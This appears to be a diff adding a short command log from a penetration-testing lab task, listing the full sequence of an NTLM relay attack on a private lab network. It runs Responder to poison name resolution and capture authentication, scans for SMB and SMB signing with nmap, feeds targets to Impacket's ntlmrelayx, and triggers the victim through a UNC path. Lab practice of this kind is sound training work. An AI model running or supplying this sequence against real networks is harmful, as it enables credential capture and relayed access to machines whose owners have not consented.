@@ -1,0 +1,19 @@
+# Task 04 - Commands Used
+
+# Responder
+sudo responder -I eth0 -dwv
+
+# Check SMB port
+nmap -p445 192.168.75.136
+
+# SMB signing check
+nmap --script smb2-security-mode -p445 192.168.75.136
+
+# Create relay target file
+echo 192.168.75.136 > targets.txt
+
+# Run ntlmrelayx (Impacket)
+sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support
+
+# Windows trigger (victim side)
+\\192.168.75.135\test
